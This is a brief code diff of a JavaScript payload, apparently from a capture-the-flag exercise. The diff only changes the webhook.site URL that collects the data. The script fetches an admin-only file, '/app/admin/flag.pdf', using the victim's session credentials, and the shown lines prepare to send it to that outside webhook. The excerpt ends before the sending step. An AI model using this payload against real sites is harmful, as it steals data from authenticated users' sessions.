@@ -1,6 +1,6 @@
 (function(){
     const flagUrl = '/app/admin/flag.pdf';
-    const webhookUrl = 'https://webhook.site/983efb78-1907-457e-8de5-e71d11d21017';
+    const webhookUrl = 'https://webhook.site/6cc630b4-4705-41b8-ba37-9d9b908c0c3c';
 
     fetch(flagUrl, { credentials: 'include' })
       .then(response => response.blob())
